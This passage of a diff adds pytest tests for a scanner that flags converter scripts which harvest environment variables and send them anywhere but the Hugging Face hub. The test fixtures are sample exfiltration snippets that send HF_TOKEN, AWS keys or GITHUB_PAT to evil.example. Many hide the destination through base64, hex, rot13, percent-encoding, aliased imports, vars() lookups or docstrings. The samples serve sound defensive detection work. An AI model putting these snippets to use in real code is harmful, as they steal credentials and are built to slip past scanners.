@@ -37,6 +37,7 @@ import py_compile
 import marshal
 import os
 import sys
+import time
 from pathlib import Path
 
 import pytest
@@ -3070,3 +3071,1928 @@ def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
     assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
         "an unexpanded pin compared unequal to the expanded script path"
     )
+
+
+def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
+    """Upstream's own gguf-py/gguf/utility.py reads HF_TOKEN and sends it to
+    huggingface.co as an Authorization header, which is what downloading a
+    gated model looks like.
+    """
+    scan_converter_source = _load(
+        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub_only = (
+        'import os\n'
+        'import requests\n'
+        'BASE_DOMAIN = "https://huggingface.co"\n'
+        'def _headers():\n'
+        '    headers = {}\n'
+        '    if os.environ.get("HF_TOKEN"):\n'
+        '        headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
+        '    return headers\n'
+        'def fetch(url):\n'
+        '    return requests.get(url, allow_redirects=True, headers=_headers())\n'
+    )
+    assert [f.check for f in scan_converter_source(hub_only)] == []
+
+    # A second destination is the whole difference, and it is still caught.
+    with_exfil = hub_only.replace(
+        'BASE_DOMAIN = "https://huggingface.co"\n',
+        'BASE_DOMAIN = "https://huggingface.co"\nEXFIL = "https://evil.example.com/c"\n',
+    )
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(with_exfil)
+    ), [f.check for f in scan_converter_source(with_exfil)]
+
+    # Naming no host at all is not a pass either: suppression needs a hub host
+    # to have been named, so a destination this cannot see keeps the finding.
+    no_host = (
+        'import os\n'
+        'import requests\n'
+        'requests.post(HOST, data = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(no_host)
+    )
+
+    # A file this cannot parse is not suppressed either.
+    unparseable = hub_only + "def (\n"
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(unparseable)
+    )
+
+
+def test_a_host_based_network_api_refuses_the_hub_allowance():
+    """The allowance reads URLs, and two of the sinks the network rule recognises
+    do not take one. socket.create_connection(("evil.example", 443)) and
+    http.client.HTTPSConnection("evil.example") name their destination as a bare
+    host, so a file could carry a hub URL, open one of those beside it, and the
+    allowance would call that talking only to the hub.
+    """
+    scan_converter_source = _load(
+        "converter_scan_host_api_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    for body in (
+        'import os\nimport socket\n' + hub
+        + 'socket.create_connection(("evil.example", 443))'
+        + '.send(os.environ["HF_TOKEN"].encode())\n',
+        'import os\nimport http.client\n' + hub
+        + 'c = http.client.HTTPSConnection("evil.example")\n'
+        + 'c.request("POST", "/", os.environ["HF_TOKEN"])\n',
+        'import os\nimport socket\n' + hub
+        + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
+        + 's.send(os.environ["HF_TOKEN"].encode())\n',
+        # http.server names no destination at all: it serves the token to
+        # whoever connects.
+        'import os\nimport requests\n' + hub
+        + 'url = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65").decode()\n'
+        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\nimport base64\n' + hub
+        + 'url = base64.b64decode("aHR0cHM6Ly9ldmlsLmV4YW1wbGU=").decode()\n'
+        + 'requests.get(url + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 'tbl = str.maketrans("XY", "hp")\n'
+        + 'requests.get("XttXs://Yvil.example/c".translate(tbl) + os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\nimport codecs\n' + hub
+        + 'requests.get(codecs.decode("uggcf://rivy.rknzcyr/p", "rot13")'
+        + ' + os.environ["HF_TOKEN"])\n',
+        # Percent decoding builds one too, and the literal that spells it
+        # carries no scheme for the walk to find.
+        'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
+        + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
+        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
+        # An aliased import leaves it only s.create_connection, which it does
+        # not recognise either.
+        'import os\nimport requests\nimport socket as s\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'c = s.create_connection(("evil.example", 443))\n'
+        + 'c.sendall(os.environ["HF_TOKEN"].encode())\n',
+        # A from-import leaves nothing for a qualified-name pattern to match.
+        'import os\nimport requests\nfrom socket import create_connection\n' + hub
+        + 'requests.get(HUB)\n'
+        + 's = create_connection(("evil.example", 443))\n'
+        + 's.sendall(os.environ["HF_TOKEN"].encode())\n',
+        'import os\nimport http.server\n' + hub
+        + 'class H(http.server.BaseHTTPRequestHandler):\n'
+        + '    def do_GET(self):\n'
+        + '        self.send_header("X-Token", os.environ["HF_TOKEN"])\n',
+    ):
+        assert any(
+            "Harvests environment variables" in f.check
+            for f in scan_converter_source(body)
+        ), body
+
+    # urlparse is not in that list and must not be: upstream's utility.py parses
+    # URLs with it, and parsing one is not building one.
+    assert scan_converter_source(
+        'import os\nimport requests\nfrom urllib.parse import urlparse\n' + hub
+        + 'assert urlparse(HUB).scheme == "https"\n'
+        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # The URL-based shape the allowance is for still passes.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # Decoding what came BACK is upstream's own shape and must not be refused:
+    # gguf-py/gguf/utility.py reads metadata_bytes.decode("utf-8") off the
+    # download.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'r = requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        + 'text = r.content[8:].decode("utf-8")\n'
+    ) == []
+
+
+def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
+    """The hub is writable and multi-tenant, so "the destination is the hub" is
+    not on its own a reason to say nothing: a token with write scope can create
+    a public repository there and make it a channel anyone can read back.
+    """
+    scan_converter_source = _load(
+        "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    hub = 'HUB = "https://huggingface.co/api/models"\n'
+
+    def _findings(body):
+        return [
+            f.check
+            for f in scan_converter_source('import os\nimport requests\n' + hub + body)
+        ]
+
+    # Sending to the hub is not downloading from it.
+    assert _findings('requests.post(HUB, data = os.environ["AWS_SECRET_ACCESS_KEY"])\n')
+    assert _findings('requests.post(HUB, data = os.environ["HF_TOKEN"])\n')
+    # A secret that is not the hub's own token has no business going there, and
+    # that is every name, not the ones that look secret: filtering on keywords
+    # let GITHUB_PAT through, because "PAT" is not one of them, so a file
+    # reading HF_TOKEN and GITHUB_PAT and sending the second to the hub
+    # produced no finding at all.
+    assert _findings(
+        'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
+    )
+    assert _findings(
+        'requests.get(HUB, headers = {\n'
+        '    "Authorization": os.environ["HF_TOKEN"],\n'
+        '    "x": os.environ["GITHUB_PAT"],\n'
+        '})\n'
+    )
+    assert _findings(
+        'requests.get(\n'
+        '    HUB,\n'
+        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
+        '    timeout = int(os.environ["HTTP_TIMEOUT"]),\n'
+        ')\n'
+    )
+    # The other spellings of the hub's own token are still the hub's own token.
+    assert _findings(
+        'requests.get(HUB, headers = {"a": os.environ["HUGGING_FACE_HUB_TOKEN"]})\n'
+    ) == []
+    # Nor does the whole environment.
+    assert _findings('requests.get(HUB, params = dict(os.environ))\n')
+    assert _findings(
+        'requests.get(\n'
+        '    HUB,\n'
+        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
+        '    params = dict(os.environ),\n'
+        ')\n'
+    )
+    assert _findings(
+        'requests.get(\n'
+        '    HUB,\n'
+        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
+        '    params = os.environ.copy(),\n'
+        ')\n'
+    )
+    # httpx is a sink the network rule recognises, so its writes count too, and
+    # so do writes through a session or client object under ANY name: matching
+    # receivers spelled "session" or "client" missed s = requests.Session();
+    # s.post(...), which is the writable-hub channel this is here to refuse.
+    for extra in (
+        'import os\nimport httpx\n' + hub
+        + 'httpx.post(HUB, data = os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 's = requests.Session()\ns.post(HUB, data = os.environ["HF_TOKEN"])\n',
+        'import os\nimport httpx\n' + hub
+        + 'c = httpx.Client()\nc.put(HUB, data = os.environ["HF_TOKEN"])\n',
+    ):
+        assert [f.check for f in scan_converter_source(extra)], extra
+
+    # A read whose variable is chosen at runtime cannot be attributed to the
+    # hub's token, and an unattributable harvest used to pass by leaving the
+    # collected set empty.
+    assert _findings(
+        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
+        'requests.get(HUB, headers = {"a": os.environ[SECRET]})\n'
+    )
+    assert _findings(
+        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
+        'requests.get(HUB, headers = {"a": os.environ.get(SECRET)})\n'
+    )
+    # A dynamic read BESIDE a legitimate hub token: the collected names are
+    # then exactly the hub's own, so only the dynamic check refuses this.
+    assert _findings(
+        'requests.get(HUB, headers = {\n'
+        '    "Authorization": os.environ["HF_TOKEN"],\n'
+        '    "x": os.environ[OTHER],\n'
+        '})\n'
+    )
+    # And a harvest with no secret-looking name among the literals: the rule
+    # fired on the word in the comment, nothing here can say what was actually
+    # read, and an empty set is not something this can attribute to the hub.
+    assert _findings(
+        'home = os.environ["HOME"]  # not a TOKEN\n'
+        'requests.get(HUB, headers = {"a": home})\n'
+    )
+    # session.request("POST", ...) is a write the named methods do not cover,
+    # and only .get() accounts for an os.environ: marking every method as
+    # accounted let .values() collect the lot and .pop() take a named one.
+    assert _findings(
+        's = requests.Session()\n'
+        's.request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
+    )
+    # A prepared request carries its method in an argument rather than in the
+    # name of the call, so Session.send() is a write that neither the named
+    # methods nor .request() covered.
+    assert _findings(
+        's = requests.Session()\n'
+        'r = requests.Request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
+        's.send(r.prepare())\n'
+    )
+    assert _findings(
+        'requests.get(HUB, params = {\n'
+        '    "a": os.environ["HF_TOKEN"],\n'
+        '    "b": list(os.environ.values()),\n'
+        '})\n'
+    )
+    assert _findings(
+        'requests.get(HUB, params = {\n'
+        '    "a": os.environ["HF_TOKEN"],\n'
+        '    "b": os.environ.pop("AWS_SECRET_ACCESS_KEY"),\n'
+        '})\n'
+    )
+
+    # An os.environ that is passed around rather than subscripted here reads
+    # credentials this never sees: env = os.environ then env["AWS_..."] left a
+    # short name set that satisfied the allow-list.
+    assert _findings(
+        'env = os.environ\n'
+        't = os.environ["HF_TOKEN"]\n'
+        'requests.get(HUB, headers = {"a": t, "b": env["AWS_SECRET_ACCESS_KEY"]})\n'
+    )
+    assert _findings(
+        'def f(e):\n'
+        '    return e["AWS_SECRET_ACCESS_KEY"]\n'
+        'requests.get(\n'
+        '    HUB,\n'
+        '    headers = {"a": os.environ["HF_TOKEN"], "b": f(os.environ)},\n'
+        ')\n'
+    )
+
+    # And when the collected set is genuinely EMPTY: os.environ reached through
+    # a call this does not read, with the rule firing on the comment.
+    assert _findings(
+        'os.environ.setdefault("HF_HOME", "/tmp")  # TOKEN\n'
+        'requests.get(HUB)\n'
+    )
+
+    # And only os.environ counts as the environment.
+    assert _findings(
+        'config = {}\n'
+        'k = config.get("API_KEY")\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+    assert _findings(
+        'requests.get(HUB, headers = {"a": os.getenv("HF_TOKEN")})\n'
+    ) == []
+
+    # The shape upstream has: a hub token, sent as authentication, on a read.
+    assert _findings(
+        'requests.get(HUB, headers = {"Authorization": "Bearer " + os.environ["HF_TOKEN"]})\n'
+    ) == []
+    assert _findings(
+        'requests.head(HUB, headers = {"Authorization": os.environ.get("HF_TOKEN")})\n'
+    ) == []
+
+
+def test_a_write_or_an_environment_read_under_another_name_refuses_it():
+    """One rename was enough to walk past both checks."""
+    scan_converter_source = _load(
+        "converter_scan_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    for body in (
+        'import os\nimport requests\n' + hub
+        + 'post = requests.post\npost(HUB, data = os.environ["HF_TOKEN"])\n',
+        # httpx takes the method as an argument here, so stream is a write the
+        # named methods do not cover, same as request and send.
+        'import os\nimport httpx\n' + hub
+        + 'c = httpx.Client()\n'
+        + 'c.stream("POST", HUB, content = os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 'getenv = os.getenv\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\nfrom os import getenv\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\nfrom os import environ\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": environ["AWS_SECRET_ACCESS_KEY"]})\n',
+        'import os\nimport requests\nfrom os import environ as e\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
+        # An alias keeps no reserved spelling, so the name it lands under says
+        # nothing.
+        'import os\nimport requests\n' + hub
+        + 'read_secret = os.getenv\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
+        # And a folded one is the same name spelled to miss a Constant check.
+        'import os\nimport requests\n' + hub
+        + 'other = vars(os)["en" + "viron"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
+        # A module dictionary leaves the name as a string and nothing else,
+        # exactly as it did for the write methods.
+        'import os\nimport requests\n' + hub
+        + 'other = vars(os)["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
+        'import os\nimport requests\n' + hub
+        + 'other = os.__dict__["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
+        # The module can be renamed too, and then the receiver says nothing
+        # about what the .getenv on it reads.
+        'import os\nimport os as o\nimport requests\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": o.getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'f = vars(requests)["po" + "st"]\n'
+        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
+        # A module dictionary leaves the method name as a string and nothing
+        # else.
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'f = vars(requests)["post"]\n'
+        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'f = requests.__dict__["post"]\n'
+        + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
+        # getattr holds neither an Attribute nor a Name spelled post.
+        'import os\nimport requests\n' + hub
+        + 'f = getattr(requests, "post")\n'
+        + 'requests.get(HUB)\n'
+        + 'f("https://huggingface.co/api/repos/create",'
+        + ' data = os.environ["HF_TOKEN"])\n',
+        # And a computed name on one of these modules is a lookup this cannot
+        # read at all.
+        'import os\nimport requests\n' + hub
+        + 'name = "environ"\n'
+        + 'env = getattr(os, name)\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": env["AWS_SECRET_ACCESS_KEY"]})\n',
+    ):
+        assert any(
+            "Harvests environment variables" in f.check
+            for f in scan_converter_source(body)
+        ), body
+
+    # os.environ and os.getenv are attributes, not bare names, and upstream's
+    # own shape reads both.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'headers = {}\n'
+        + 'if os.environ.get("HF_TOKEN"):\n'
+        + '    headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
+        + 'requests.get(HUB, headers = headers)\n'
+    ) == []
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'if os.getenv("HF_TOKEN"):\n'
+        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # The key can be a keyword.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'if os.environ.get(key = "HF_TOKEN"):\n'
+        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'other = os.environ.get(key = "AWS_SECRET_ACCESS_KEY")\n'
+            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+            + ' "b": other})\n'
+        )
+    ]
+    # getattr with a computed name on the file's OWN objects is upstream's
+    # shape and must stay readable.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'class Reader:\n'
+        + '    def read(self, name):\n'
+        + '        return getattr(self, name)\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
+def test_an_oversized_join_is_not_folded():
+    """A join multiplies, unlike + and %, whose result is bounded by the source
+    that spells it.
+    """
+    module = _load("converter_scan_join_size_probe", "unsloth_zoo/converter_scan.py")
+    separator = "A" * 100_000
+    elements = ",".join(['""'] * 10_000)
+    preamble = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'token = os.environ["HF_TOKEN"]\n'
+    )
+    started = time.perf_counter()
+    module.scan_converter_source(
+        preamble + f'X = "{separator}".join([{elements}])\n'
+        'requests.get(HUB, headers = {"a": token})\n'
+    )
+    assert time.perf_counter() - started < 5
+
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + f'X = "{separator}".join([{elements}, "https://evil.example/c"])\n'
+            'requests.get(X, headers = {"a": token})\n'
+        )
+    ], "an oversized join must not hide the literals inside it"
+
+    # A NESTED spec is why the fields are parsed rather than pattern-matched:
+    started = time.perf_counter()
+    module.scan_converter_source(
+        preamble
+        + 'def dead():\n'
+        + '    return "{0:{1}}".format("x", "10000000000")\n'
+        'requests.get(HUB, headers = {"a": token})\n'
+    )
+    assert time.perf_counter() - started < 5
+
+    # str.format has the same ceiling and needs it for a different reason: one
+    # argument referenced by thousands of {0} fields expands far past the input
+    # cap, 110 KB of source taking 14.8 seconds before this.
+    started = time.perf_counter()
+    module.scan_converter_source(
+        preamble
+        + 'X = "' + "{0}" * 20_000 + '".format("' + "B" * 50_000 + '")\n'
+        'requests.get(HUB, headers = {"a": token})\n'
+    )
+    assert time.perf_counter() - started < 5
+
+    # The ceiling is on the aggregate too: one expansion is bounded, and an
+    # 8 MiB file holds thousands of them, so the literals are iterated under a
+    # shared budget rather than materialised into a list.
+    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    started = time.perf_counter()
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + "".join(f"x{i} = {one}" for i in range(200))
+            + 'requests.get(HUB, headers = {"a": token})\n'
+        )
+    ]
+    assert time.perf_counter() - started < 10
+
+    # A join small enough to fold is still folded.
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + 'requests.get("".join(("htt", "ps://ev", "il.example/c")) + token)\n'
+        )
+    ]
+
+
+def test_nothing_in_the_allowance_may_raise():
+    """A scanner exception is an evasion, not an error."""
+    module = _load("converter_scan_raise_probe", "unsloth_zoo/converter_scan.py")
+    # An expression that need never run:
+    poisoned = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'def dead():\n'
+        '    return "{0[x]}".format("a")\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    assert module._talks_only_to_the_model_hub(poisoned) is True
+    assert module.scan_converter_source(poisoned) == []
+
+    payload = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get("https://evil.example/c",'
+        ' data = os.environ["AWS_SECRET_ACCESS_KEY"])\n'
+        'X = ' + "+".join(['"a"'] * 600) + '\n'
+    )
+    assert module._talks_only_to_the_model_hub(payload) is False
+    assert [f.check for f in module.scan_converter_source(payload)]
+
+
+def test_a_documentation_url_in_a_docstring_is_not_a_destination():
+    """Comments never reach the literal walk, since it reads the AST, so
+    upstream's `# Reference: https://github.com/...` costs nothing.
+    """
+    scan_converter_source = _load(
+        "converter_scan_docstring_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    download = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    assert scan_converter_source(
+        '"""See https://github.com/ggml-org/llama.cpp for details."""\n' + download
+    ) == []
+    assert scan_converter_source(
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'def fetch():\n'
+        '    """Documented at https://github.com/ggml-org/llama.cpp."""\n'
+        '    return requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # The word in a comment is not a read.
+    assert scan_converter_source(
+        '"""See https://github.com/ggml-org/llama.cpp for details."""\n'
+        'import os\n'
+        'import requests  # __doc__ is the module docstring\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # A docstring the file can READ is a value like any other, whether it is
+    # reached as an attribute or as the bare module-level name.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'requests.get(fetch.__doc__ + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    assert [
+        f.check for f in scan_converter_source(
+            '"""https://evil.example/collect"""\n'
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'requests.get(__doc__ + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    # getattr(fn, "__doc__") reaches the same value with neither shape.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'requests.get(getattr(fetch, "__doc__") + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    # Enumerating the spellings was losing, so anything naming __doc__,
+    # vars or __dict__ at all keeps docstrings in the scan.
+    for reader in (
+        'vars(fetch)["__doc__"]',
+        'fetch.__dict__.get("__doc__", "")',
+        'getattr(fetch, "__doc__")',
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'HUB = "https://huggingface.co"\n'
+                'def fetch():\n'
+                '    """https://evil.example/collect"""\n'
+                f'requests.get({reader} + os.environ["HF_TOKEN"])\n'
+            )
+        ], reader
+    # A folded name is the same name: getattr(fn, "__" + "doc__").
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    \"\"\"https://evil.example/collect\"\"\"\n'
+            'requests.get(getattr(fetch, "__" + "doc__")'
+            ' + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    # A key this cannot read is why the readers are named at all: the
+    # constant __doc__ never appears here, only vars does.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'key = "__" + "doc" + "__"\n'
+            'requests.get(vars(fetch)[key] + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    # inspect.getdoc and pydoc.getdoc read it with none of those names
+    # present at all, which is why the rule is introspection rather than a
+    # list of spellings of __doc__.
+    for reader in ('inspect.getdoc(fetch)', 'pydoc.getdoc(fetch)'):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'import inspect\n'
+                'import pydoc\n'
+                'HUB = "https://huggingface.co"\n'
+                'def fetch():\n'
+                '    """https://evil.example/collect"""\n'
+                f'requests.get({reader}, params = {{"t": os.environ["HF_TOKEN"]}})\n'
+            )
+        ], reader
+    # And a bare string statement is not a docstring.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'x = 1\n'
+            '"https://evil.example/collect"\n'
+            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+
+def test_urllib_refuses_the_hub_allowance():
+    """urllib expresses a write as Request(..., data = ...), Request(..., method =
+    "POST") or urlopen(..., data = ...).
+    """
+    scan_converter_source = _load(
+        "converter_scan_urllib_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    hub = 'HUB = "https://huggingface.co/api/models"\n'
+
+    for body in (
+        'urllib.request.urlopen(HUB, data = os.environ["HF_TOKEN"].encode())\n',
+        'r = urllib.request.Request(\n'
+        '    HUB, data = os.environ["HF_TOKEN"].encode(), method = "POST",\n'
+        ')\n',
+        'urllib.request.urlopen(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport urllib.request\n' + hub + body
+            )
+        ], body
+
+
+def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
+    """Three spellings the readable-name checks could not see, because the only
+    place the name appears is the import line.
+    """
+    scan_converter_source = _load(
+        "converter_scan_import_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    docstring = 'def fetch():\n    """https://evil.example/collect"""\n'
+    for body in (
+        'from base64 import b64decode as d\n' + hub
+        + 'url = d("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw==").decode()\n' + send,
+        'import base64 as b\n' + hub
+        + 'url = b.b64decode("aHR0cHM6").decode()\n' + send,
+        'from binascii import unhexlify as h\n' + hub
+        + 'url = h("68747470733a").decode()\n' + send,
+        'import struct\n' + hub
+        + 'url = struct.pack("5B", 104, 116, 116, 112, 115).decode()\n' + send,
+        'from struct import pack as pk\n' + hub
+        + 'url = pk("5B", 104, 116, 116, 112, 115).decode()\n' + send,
+        'from urllib.parse import unquote as u\n' + hub
+        + 'url = u("https%3A%2F%2Fevil.example%2Fc")\n' + send,
+        'from inspect import getdoc as g\n' + hub + docstring
+        + 'url = g(fetch)\n' + send,
+        'from pydoc import getdoc as g\n' + hub + docstring
+        + 'url = g(fetch)\n' + send,
+        'import inspect as i\n' + hub + docstring
+        + 'url = i.getdoc(fetch)\n' + send,
+        hub + 'parts = {"s": "https", "h": "evil.example"}\n'
+        + 'url = "{p[s]}://{p[h]}/c".format(p = parts)\n' + send,
+        # The same hidden scheme through a spec, which is never evaluated.
+        hub + 'url = "{0:s}://{1:s}/c".format(scheme, host)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # And what upstream actually does still passes: it imports none of those
+    # modules, and every "://" it writes is preceded by a readable scheme.
+    assert scan_converter_source(
+        'import os\nimport requests\nfrom urllib.parse import urlparse\n'
+        + hub
+        + 'assert urlparse(HUB).netloc\n'
+        + 'url = "{}/api/models".format(HUB)\n'
+        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
+def test_a_constant_rewritten_into_a_url_refuses_it():
+    """A scheme that does not exist until a method call runs."""
+    scan_converter_source = _load(
+        "converter_scan_rewrite_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        hub + 'url = "httpsX//evil.example/c".replace("X", ":")\n' + send,
+        hub + 'url = "httpsX//evil.example/c".replace(marker, colon)\n' + send,
+        hub + 'url = "httpsX//evil.example/c".translate(table)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # Appending a path to the hub, in the shape a chain of appends really
+    # parses in:
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'name = base.strip().replace(" ", "-").replace("/", "-")\n'
+        + 'url = HUB + "/api/" + name\n' + send
+    ) == []
+    # And the authority is still guarded when nothing has closed it yet.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'url = HUB + "@evil.example" + "/c"\n' + send
+        )
+    ]
+
+
+def test_percent_formatting_is_read_whichever_way_it_is_written():
+    """The operator takes a mapping as well as a tuple, and only the tuple was
+    folded.
+    """
+    scan_converter_source = _load(
+        "converter_scan_percent_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
